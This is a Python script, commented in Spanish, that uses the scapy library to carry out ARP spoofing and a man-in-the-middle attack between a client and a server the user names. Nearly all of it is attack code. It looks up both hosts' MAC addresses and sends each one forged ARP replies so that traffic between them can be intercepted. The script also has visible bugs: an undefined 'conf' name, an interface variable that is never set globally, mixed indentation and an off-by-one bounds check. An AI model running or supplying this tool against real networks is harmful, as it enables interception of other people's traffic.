#! /usr/bin/env python
# -*- coding: utf-8 -*-

import scapy.all as scapy
import random
import time

semaforo=0
nombreInterfaz=""
 
def semaphore():
    global semaforo
    if(semaforo==0):
        semaforo=1
    else:
        wait()

def wait():
    while 1:
        global semaforo
        if semaforo == 0:
            return   

def freeSemaphore():
    global semaforo
    semaforo=0  

def uploadPacket(packet):
    scapy.ls(packet[0][1])
    print("----------------------------\n")
    if(packet[0][1].op==1):
        print("Se recibio nuevo arp request")
        print("Se ha suplantado la conexion entre ", packet[0][1].psrc," y ",packet[0][1].pdst)
        arpSpoofing(packet[0][1].psrc, packet[0][1].pdst)
        return

def manInTheMiddle():
    scapy.sniff(filter="arp",prn=uploadPacket, count=1, iface=nombreInterfaz)

def obtenerMac(ip):
    arp= scapy.ARP()
    ethernet=scapy.Ether()
    ethernet.dst='ff:ff:ff:ff:ff:ff'
    arp.pdst=ip
    arp.timeout=3
    arp.verbose=0

    respuesta,_ = scapy.srp(ethernet/arp, iface=nombreInterfaz )
    if respuesta:
        return respuesta[0][1].src

def arpSpoofing(ipCliente, ipServidor):
    semaphore()
    macCliente=obtenerMac(ipCliente)
    freeSemaphore()
    semaphore()
    macServidor=obtenerMac(ipServidor)
    freeSemaphore()
    arpRespuestaACliente=scapy.ARP()
    arpRespuestaACliente.pdst=ipCliente
    arpRespuestaACliente.hwdst=macCliente
    arpRespuestaACliente.psrc=ipServidor
    arpRespuestaACliente.op=2
    ethernet=scapy.Ether()
    ethernet.src=arpRespuestaACliente.hwsrc
    ethernet.dst=arpRespuestaACliente.hwdst
    ethernet.type=2054
    fusion=ethernet/arpRespuestaACliente
    semaphore()
    scapy.sendp(fusion, iface=nombreInterfaz)
    freeSemaphore()
    arpRespuestaAlServidor=scapy.ARP()
    arpRespuestaAlServidor.op=2
    arpRespuestaAlServidor.pdst=ipServidor
    arpRespuestaAlServidor.psrc=ipCliente
    arpRespuestaAlServidor.hwdst=macServidor
    ethernet.src=arpRespuestaAlServidor.hwsrc
    ethernet.dst=arpRespuestaAlServidor.hwdst
    fusion=ethernet/arpRespuestaAlServidor
    semaphore()
    scapy.sendp(fusion, iface=nombreInterfaz)
    freeSemaphore()

def get_interfaces():
    interfaces = []
    macs=[]
    for iface_name in sorted(scapy.ifaces.data.keys()):
        dev = scapy.ifaces.data[iface_name]
        mac = str(dev.mac)
        mac = conf.manufdb._resolve_MAC(mac)
        mac=str(mac)
        nombre=str(dev.name).ljust(4)
        macs.append(mac )
        interfaces.append(nombre)
    return interfaces, macs


def main():

    print("Ataque suplantación MAC y MiTM en una conexión determinada")
    try:
        print("Ingresar la direccion ipv4 del cliente")
        cliente=input()

        print("Integrasar la direccion ipv4 del servidor")
        servidor=input()

        sigue=True

        print("Seleccionar interfaz sobre el que quiere realizar el ataque\n")
        interfaces, macs=get_interfaces()
        for i in range(0,len(interfaces)):
            print("Opcion #",str(i)," :",interfaces[i]," de mac ", macs[i])

        while (sigue):
            print("Digitar el numero correspondiente a la interfaz")
            opcion=int(input())
            if 0<=opcion<=len(interfaces):
                nombreInterfaz=interfaces[opcion]
                sigue=False
            else:
                print("Seleccione un numero valido")

        arpSpoofing(cliente,servidor)

        print("ARP Spoofing entre los ordenadores ",cliente, " y ", servidor," realizado correctamente.\n")
    except ValueError as error:
		print("Error: {0}".format(error))
		return 1

	return 0

if __name__ == '__main__':
	exit(main())



